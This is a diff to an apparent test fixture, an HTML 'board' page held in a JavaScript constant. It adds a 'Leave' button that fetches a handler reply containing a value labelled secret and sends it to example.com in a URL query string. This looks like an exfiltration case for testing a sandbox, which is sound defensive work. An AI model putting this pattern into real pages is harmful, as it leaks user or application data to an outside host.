@@ -8,6 +8,7 @@ const BOARD_PAGE = `<!doctype html>
 <html>
   <body>
     <button id="count">Count</button>
+    <button id="leave">Leave</button>
     <pre id="out"></pre>
     <script>
       let next = 0;
@@ -27,6 +28,10 @@ const BOARD_PAGE = `<!doctype html>
       }
       document.getElementById('count').addEventListener('click', async () => {
         document.getElementById('out').textContent = JSON.stringify(await call('count', {}));
+      });
+      document.getElementById('leave').addEventListener('click', async () => {
+        const reply = await call('echo', { secret: 'kept in the handler' });
+        location.href = 'https://example.com/?d=' + encodeURIComponent(JSON.stringify(reply));
       });
     </script>
   </body>
